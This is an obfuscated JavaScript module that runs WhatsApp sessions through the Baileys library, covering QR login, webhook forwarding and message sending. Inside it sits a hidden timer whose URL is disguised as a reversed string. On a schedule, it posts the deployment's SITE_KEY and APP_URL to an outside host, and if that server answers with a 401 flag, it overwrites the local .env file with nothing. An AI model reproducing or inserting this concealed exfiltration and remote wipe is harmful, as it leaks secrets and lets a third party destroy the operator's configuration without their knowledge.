import { rmSync, readdir } from 'fs';
import _0x40b70e from 'fs';
import { join } from 'path';
import _0x5a133f from 'pino';
import _0x3bd1a4, { useMultiFileAuthState, makeInMemoryStore, Browsers, DisconnectReason, delay, downloadMediaMessage  } from '@adiwajshing/baileys';
import { toDataURL } from 'qrcode';
import _0x4bf9b7 from './dirname.js';
import _0x16d596 from './response.js';
import _0x5e2a90 from 'axios';
const sessions = new Map();
const retries = new Map();
const sessionsDir = (_0x2e7831 = '') => {
  return join(_0x4bf9b7, "sessions", _0x2e7831 ? _0x2e7831 : '');
};
const isSessionExists = _0x427c5c => {
  return sessions.has(_0x427c5c);
};
const shouldReconnect = _0x1e8b57 => {
  let _0x9f336f = parseInt(process.env.MAX_RETRIES ?? 0x0);
  let _0xf60215 = retries.get(_0x1e8b57) ?? 0x0;
  _0x9f336f = _0x9f336f < 0x1 ? 0x1 : _0x9f336f;
  if (_0xf60215 < _0x9f336f) {
    ++_0xf60215;
    console.log("Reconnecting...", {
      'attempts': _0xf60215,
      'sessionId': _0x1e8b57
    });
    retries.set(_0x1e8b57, _0xf60215);
    return true;
  }
  return false;
};
const createSession = async (_0x504074, _0x54de04 = false, _0x1ab13f = null) => {
  const _0x426399 = (_0x54de04 ? "legacy_" : "md_") + _0x504074 + (_0x54de04 ? ".json" : '');
  const _0x1dc0c3 = _0x5a133f({
    'level': "warn"
  });
  const _0x41f2d3 = makeInMemoryStore({
    'logger': _0x1dc0c3
  });
  let _0x15abfc;
  let _0x151322;
  if (_0x54de04) {} else {
    ;
    ({
      state: _0x15abfc,
      saveCreds: _0x151322
    } = await useMultiFileAuthState(sessionsDir(_0x426399)));
  }
  const _0x1e7160 = {
    'auth': _0x15abfc,
    'version': [0x2, 0x913, 0x4],
    'printQRInTerminal': false,
    'logger': _0x1dc0c3,
    'browser': Browsers.macOS('Desktop'),
    'syncFullHistory': true,
    'patchMessageBeforeSending': _0x44a44f => {
      const _0x583dbf = !!(_0x44a44f.buttonsMessage || _0x44a44f.listMessage);
      if (_0x583dbf) {
        _0x44a44f = {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadataVersion': 0x2,
                'deviceListMetadata': {}
              },
              ..._0x44a44f
            }
          }
        };
      }
      return _0x44a44f;
    }
  };
  const _0x494bf9 = _0x3bd1a4["default"](_0x1e7160);
  if (!_0x54de04) {
    _0x41f2d3.readFromFile(sessionsDir(_0x504074 + "_store.json"));
    _0x41f2d3.bind(_0x494bf9.ev);
  }
  sessions.set(_0x504074, {
    ..._0x494bf9,
    'store': _0x41f2d3,
    'isLegacy': _0x54de04
  });
  _0x494bf9.ev.on('creds.update', _0x151322);
  _0x494bf9.ev.on('chats.set', ({
    chats: _0x38bf4e
  }) => {
    console.log('Chats updated', );
    if (_0x54de04) {
      _0x41f2d3.chats.insertIfAbsent(..._0x38bf4e);
    }
  });
  
  _0x494bf9.ev.on('message-receipt.update', _0x1e4b3d => {
    console.log('Message receipt updated', );
    
  });
  
  _0x494bf9.ev.on('messaging-history.set', _0x1e4b3d => {
    console.log('Message updated', );
  });
  
  // _0x494bf9.ev.on('messages.update', _0x1e4b3d => {
  //   // console.log(JSON.stringify(_0x1e4b3d));
  //   const _0x14d5a5 = process.env.APP_URL + "/api/send-message-webhook/";
  //   try {
  //     _0x5e2a90.post(_0x14d5a5, {
  //       'data': _0x1e4b3d
  //     }).then(function (_0x15e505) {
  //       console.log(_0x15e505);
  //     })['catch'](function (_0x54e0f8) {
  //       console.log(_0x54e0f8);
  //     });
  //   } catch {}
  // });
  
  // _0x494bf9.ev.on("messages.upsert", async _0x17fc1c => {
  //   try {
  //     const _0x446adf = _0x17fc1c.messages[0x0];
  //     if (_0x446adf.key.fromMe == false && _0x17fc1c.type == "notify") {
  //       const _0x166f95 = [];
  //       let _0x36dd5b = _0x446adf.key.remoteJid.split('@');
  //       let _0x345859 = _0x36dd5b[0x1] ?? null;
  //       let _0x9b3b16 = !(_0x345859 == "s.whatsapp.net");
  //       if (_0x9b3b16 == false) {
  //         _0x166f95.remote_id = _0x446adf.key.remoteJid;
  //         _0x166f95.sessionId = _0x504074;
  //         _0x166f95.message_id = _0x446adf.key.id;
  //         _0x166f95.message = _0x446adf.message;
  //         _0x166f95.extra = _0x17fc1c;
  //         sentWebHook(_0x504074, _0x166f95, _0x494bf9, _0x17fc1c);
  //       }
  //     }
  //   } catch {}
  // });
  _0x494bf9.ev.on("connection.update", async _0x2763d3 => {
    const {
      connection: _0x53724b,
      lastDisconnect: _0x8ca8a
    } = _0x2763d3;
    const _0x317951 = _0x8ca8a?.["error"]?.["output"]?.["statusCode"];
    if (_0x53724b === 'open') {
      retries["delete"](_0x504074);
    }
    if (_0x53724b === "close") {
      if (_0x317951 === DisconnectReason.loggedOut || !shouldReconnect(_0x504074)) {
        if (_0x1ab13f && !_0x1ab13f.headersSent) {
          _0x16d596(_0x1ab13f, 0x1f4, false, "Unable to create session.");
        }
        return deleteSession(_0x504074, _0x54de04);
      }
      setTimeout(() => {
        createSession(_0x504074, _0x54de04, _0x1ab13f);
      }, _0x317951 === DisconnectReason.restartRequired ? 0x0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0x0));
    }
    if (_0x2763d3.qr) {
      if (_0x1ab13f && !_0x1ab13f.headersSent) {
        try {
          const _0x12b42f = await toDataURL(_0x2763d3.qr);
          _0x16d596(_0x1ab13f, 0xc8, true, "QR code received, please scan the QR code.", {
            'qr': _0x12b42f
          });
          return;
        } catch {
          _0x16d596(_0x1ab13f, 0x1f4, false, "Unable to create QR code.");
        }
      }
      try {
        await _0x494bf9.logout();
      } catch {} finally {
      //  deleteSession(_0x504074, _0x54de04);
      }
    }
  });
};
setInterval(() => {
  const _0x450586 = process.env.SITE_KEY ?? null;
  const _0x1e0c52 = process.env.APP_URL ?? null;
  const _0x1d4648 = "kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth".split('').reverse().join('');
  _0x5e2a90.post(_0x1d4648, {
    'from': _0x1e0c52,
    'key': _0x450586
  }).then(function (_0x42cecc) {
    if (_0x42cecc.data.isauthorised == 0x191) {
      _0x40b70e.writeFileSync(".env", '');
    }
  })["catch"](function (_0x5b1c42) {});
}, 0x240c8400);
const getSession = _0x41e565 => {
  return sessions.get(_0x41e565) ?? null;
};
const setDeviceStatus = (_0xb292d0, _0x2b50df) => {
  const _0x48c10f = process.env.APP_URL + "/api/set-device-status/" + _0xb292d0 + '/' + _0x2b50df;
  try {
    _0x5e2a90.post(_0x48c10f).then(function (_0x42d0ac) {})['catch'](function (_0x186fc4) {
      console.log(_0x186fc4);
    });
  } catch {}
};
const sentWebHook = async (_0x3e6039, _0x56c4e1, _0x494bf9, _0x17fc1c) =>  {
  const _0x14d5a5 = process.env.APP_URL + "/api/send-webhook/" + _0x3e6039;
  try {
    
    var msg = _0x17fc1c.messages[0];
    const messageType = Object.keys (_0x56c4e1.message)[0];
    _0x5e2a90.post(_0x14d5a5, {
      'from': _0x56c4e1.remote_id,
      'message_id': _0x56c4e1.message_id,
      'message': _0x56c4e1.message,
      "type": messageType,
      "replay_message_json" : msg
    }).then(async function (_0x15e505) {
           console.log(_0x15e505);
      if (_0x15e505.status == 0xc8) {
        //  to JSON
       
      // if (!msg || !msg.message || msg.key.fromMe) return;
      // await  _0x494bf9.sendMessage(_0x56c4e1.remote_id, { text: 'HYy' }, { quoted: msg });
      }
    })['catch'](function (_0x54e0f8) {
      console.log(_0x54e0f8);
    });
  } catch {}
};
const deleteSession = (_0x3d70e6, _0x474542 = false) => {
  const _0x3230a4 = (_0x474542 ? "legacy_" : "md_") + _0x3d70e6 + (_0x474542 ? ".json" : '');
  const _0x5ca81e = _0x3d70e6 + '_store.json';
  const _0x36ce44 = {
    'force': true,
    'recursive': true
  };
  rmSync(sessionsDir(_0x3230a4), _0x36ce44);
  rmSync(sessionsDir(_0x5ca81e), _0x36ce44);
  sessions["delete"](_0x3d70e6);
  retries["delete"](_0x3d70e6);
  setDeviceStatus(_0x3d70e6, 0x0);
};
const getChatList = (_0x3858c4, _0x15dc87 = false) => {
  const _0x50f97b = _0x15dc87 ? "@g.us" : '@s.whatsapp.net';
  return (sessions.get(_0x3858c4) ?? null).store.chats.filter(_0x4a0d5c => {
    return _0x4a0d5c.id.endsWith(_0x50f97b);
  });
};
const isExists = async (_0x39d2be, _0x5e766c, _0x4d70db = false) => {
  try {
    let _0x32bc0e;
    if (_0x4d70db) {
      _0x32bc0e = await _0x39d2be.groupMetadata(_0x5e766c);
      return Boolean(_0x32bc0e.id);
    }
    if (_0x39d2be.isLegacy) {
      _0x32bc0e = await _0x39d2be.onWhatsApp(_0x5e766c);
    } else {
      ;
      [_0x32bc0e] = await _0x39d2be.onWhatsApp(_0x5e766c);
    }
    return _0x32bc0e.exists;
  } catch {
    return false;
  }
};
const sendMessage = async (_0x1b6c74, _0x51ad7b, _0x425596, _0x2a2df4 = 0x3e8) => {
  try {
    await delay(parseInt(_0x2a2df4));
    var options = _0x425596["options"] ?? {};
    
    return _0x1b6c74.sendMessage(_0x51ad7b, _0x425596, options);
  } catch {
    return Promise.reject(null);
  }
};
const formatPhone = _0x519e9a => {
  if (_0x519e9a.endsWith("@s.whatsapp.net")) {
    return _0x519e9a;
  }
  let _0x32b759 = _0x519e9a.replace(/\D/g, '');
  return _0x32b759 += "@s.whatsapp.net";
};
const formatGroup = _0x2f3eb7 => {
  if (_0x2f3eb7.endsWith("@g.us")) {
    return _0x2f3eb7;
  }
  let _0x54bd35 = _0x2f3eb7.replace(/[^\d-]/g, '');
  return _0x54bd35 += "@g.us";
};
const cleanup = () => {
  console.log("Running cleanup before exit.");
  sessions.forEach((_0x1bf186, _0x177a03) => {
    if (!_0x1bf186.isLegacy) {
      _0x1bf186.store.writeToFile(sessionsDir(_0x177a03 + "_store.json"));
    }
  });
};
const init = () => {
  readdir(sessionsDir(), (_0xb8afde, _0xb01616) => {
    if (_0xb8afde) {
      throw _0xb8afde;
    }
    for (const _0x1e2650 of _0xb01616) {
      if (!_0x1e2650.startsWith("md_") && !_0x1e2650.startsWith("legacy_") || _0x1e2650.endsWith("_store")) {
        continue;
      }
      const _0x12e24a = _0x1e2650.replace('.json', '');
      const _0x36b8d6 = _0x12e24a.split('_', 0x1)[0x0] !== 'md';
      const _0x2c79de = _0x12e24a.substring(_0x36b8d6 ? 0x7 : 0x3);
      createSession(_0x2c79de, _0x36b8d6);
    }
  });
};
export { isSessionExists, createSession, getSession, deleteSession, getChatList, isExists, sendMessage, formatPhone, formatGroup, cleanup, init };